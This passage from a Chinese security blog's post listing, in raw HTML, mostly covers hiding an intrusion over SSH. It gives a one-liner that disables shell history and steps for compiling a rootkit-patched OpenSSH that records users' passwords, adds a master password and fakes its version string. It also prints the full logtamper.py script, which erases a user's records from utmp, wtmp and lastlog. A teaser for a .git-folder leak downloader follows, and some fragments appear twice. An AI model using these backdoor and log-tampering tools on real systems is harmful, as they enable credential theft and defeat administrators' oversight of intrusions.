    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
 
            <span class="token comment"># tamper</span>
            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
 
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>====<br>更新：</p>
<p>上面的可以在debain系使用，感觉下面这种方法更通用：<br>有两种方式:</p>
<ol>
<li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li>
</ol>
<p>Host *</p>
	

	</div>
  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>对于SSH来说，登录主机之后先执行：<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
<p>然后是SSH留后门的方法<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  后门
执行vi includes.h

+<span class="token comment">#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码</span>
+<span class="token comment">#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码</span>
+<span class="token comment">#define SECRETPW "123456654321" //你后门的密码</span>

执行vi version.h

<span class="token comment">#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"</span>
<span class="token comment">#define SSH_PORTABLE "小版本号"</span>
./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
<span class="token function">service</span> sshd restart //重启sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
<p>接下来删除登录的历史记录，使用<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
 
UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
 
LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
 
XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
    xtmp <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
 
            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> xtmp
 
 
<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
 
    timestamp <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
 
    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
 
 
<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> msg
    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
 
            <span class="token comment"># tamper</span>
            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
 
        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
 
            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
 
            <span class="token comment"># tamper</span>
            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
 
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>====<br>更新：</p>
<p>上面的可以在debain系使用，感觉下面这种方法更通用：<br>有两种方式:</p>
<ol>
<li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li>
</ol>
<p>Host *</p>
	
	</div>
  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/03/30/git-folder-exploit.html" >Git folder exploit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-03-30  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
</ul>
<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
</ul>
<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
	

	</div>
  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
</ul>
<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
</ul>
<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
	
	</div>
  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
